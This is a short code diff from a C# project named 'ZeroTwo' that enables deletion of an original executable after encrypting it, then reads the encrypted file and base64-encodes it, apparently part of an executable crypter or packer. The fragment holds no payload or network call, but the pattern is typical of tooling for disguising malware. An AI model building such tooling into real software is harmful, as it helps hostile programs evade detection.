@@ -41,7 +41,7 @@ namespace ZeroTwo.src {
             cs.Close();
             fsCrypt.Close();
 
-            //File.Delete(EXE);
+            File.Delete(EXE);
 
             byte[] bytes = File.ReadAllBytes(ENC_EXE);
             string encoded = Convert.ToBase64String(bytes);
